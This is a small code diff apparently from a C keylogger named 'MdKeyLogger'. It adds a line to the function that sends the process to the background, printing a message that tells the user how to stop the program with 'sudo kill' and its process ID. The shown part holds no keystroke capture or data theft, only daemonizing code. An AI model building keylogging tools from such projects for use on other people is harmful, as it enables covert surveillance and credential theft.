@@ -33,7 +33,7 @@ int change_task_to_background() {
         perror("Can't change to the root directory");
         exit(EXIT_FAILURE);
     }
-
+    printf("To stop MdKeyLogger enter this command \" sudo kill %d \"\n",getpid());
     close(STDIN_FILENO);
     close(STDOUT_FILENO);
     close(STDERR_FILENO);
